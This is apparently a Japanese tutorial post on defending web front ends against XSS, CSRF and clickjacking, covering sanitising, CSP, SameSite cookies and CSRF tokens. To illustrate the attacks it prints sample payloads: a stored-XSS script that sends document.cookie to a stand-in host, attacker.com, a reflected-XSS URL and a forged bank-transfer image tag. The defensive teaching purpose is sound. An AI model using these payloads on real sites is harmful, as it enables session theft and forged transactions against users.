---
title: "フロントエンドセキュリティ：XSS・CSRF 完全防御ガイド"
date: 2019-07-26 10:36:28
tags:
  - Security
readingTime: 3
description: "XSS と CSRF はフロントエンドで最も一般的なセキュリティ脆弱性です。この記事では両方の攻撃タイプと実践的な防御戦略を解説します。"
---

XSS と CSRF はフロントエンドで最も一般的なセキュリティ脆弱性です。この記事では両方の攻撃タイプと実践的な防御戦略を解説します。

## XSS（クロスサイトスクリプティング）

XSS 攻撃は悪意あるスクリプトを他のユーザーが閲覧するウェブページに注入します。3種類あります：

### 1. 蓄積型（Stored）XSS

悪意あるスクリプトがデータベースに保存され、感染コンテンツを閲覧する全ユーザーに配信される：

```javascript
// 攻撃者がコメントとして送信：
<script>
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify({ cookies: document.cookie })
  })
</script>
```

### 2. 反射型（Reflected）XSS

URLパラメーターを通じてスクリプトが注入され、レスポンスに反映される：

```
https://example.com/search?q=<script>alert(document.cookie)</script>
```

### 3. DOM ベース XSS

```javascript
// 脆弱なコード
const userInput = location.hash.slice(1);
document.getElementById("output").innerHTML = userInput; // 危険！
```

## XSS 防御

### innerHTML の代わりに textContent を使う

```javascript
// 危険
element.innerHTML = userInput;

// 安全
element.textContent = userInput;
```

### HTML コンテンツには DOMPurify を使う

リッチテキストエディタの出力など、HTML のレンダリングが必要な場合：

```javascript
import DOMPurify from "dompurify";

const clean = DOMPurify.sanitize(dirtyHTML, {
  ALLOWED_TAGS: ["p", "br", "strong", "em", "a", "ul", "ol", "li"],
  ALLOWED_ATTR: ["href", "target"],
});

element.innerHTML = clean;
```

### Content Security Policy（CSP）

```nginx
add_header Content-Security-Policy "
  default-src 'self';
  script-src 'self' https://cdn.trusted.com;
  style-src 'self' https://fonts.googleapis.com;
  img-src 'self' data: https:;
  connect-src 'self' https://api.myapp.com;
";
```

## CSRF（クロスサイトリクエストフォージェリ）

CSRF は認証済みユーザーを騙して悪意あるリクエストを送信させます：

```html
<!-- 攻撃者のページ -->
<img src="https://bank.com/transfer?to=attacker&amount=1000" />
<!-- ブラウザはこのリクエストに被害者のクッキーを自動的に送信 -->
```

## CSRF 防御

### SameSite クッキー

最も効果的な現代的防御——ブラウザにクロスオリジンリクエストでクッキーを送らないよう指示：

```http
Set-Cookie: sessionId=abc123; SameSite=Lax; HttpOnly; Secure
```

| 値       | 動作                                     |
| -------- | ---------------------------------------- |
| `Strict` | クロスサイトリクエストでは一切送信しない |
| `Lax`    | トップレベルナビゲーションのみ送信       |
| `None`   | 常に送信（Secure が必要）                |

### CSRF トークン

```javascript
async function securePost(url, data) {
  const csrfToken = document.querySelector('meta[name="csrf-token"]')?.content;
  return fetch(url, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "X-CSRF-Token": csrfToken,
    },
    body: JSON.stringify(data),
  });
}
```

## クリックジャッキング防御

```nginx
add_header X-Frame-Options "SAMEORIGIN";
# または CSP を使う
add_header Content-Security-Policy "frame-ancestors 'self';";
```

## セキュリティチェックリスト

- [ ] ユーザーデータに `innerHTML` を使わない — `textContent` か DOMPurify を使う
- [ ] `Content-Security-Policy` ヘッダーを設定する
- [ ] セッションクッキーに `HttpOnly` を設定する
- [ ] クッキーに `Secure` を設定する（HTTPS のみ）
- [ ] クッキーに `SameSite=Lax` または `Strict` を設定する
- [ ] 状態変更 API 呼び出しに CSRF トークンを実装する
- [ ] `X-Frame-Options` か `frame-ancestors` CSP を追加する

## まとめ

- XSS：ユーザーデータを必ずエスケープ、HTML には DOMPurify、厳格な CSP を設定
- CSRF：SameSite クッキー、CSRF トークン、またはカスタムヘッダーを使用
- クリックジャッキング：`X-Frame-Options` か `frame-ancestors` CSP を使用
- 多層防御——複数の仕組みを組み合わせることが重要
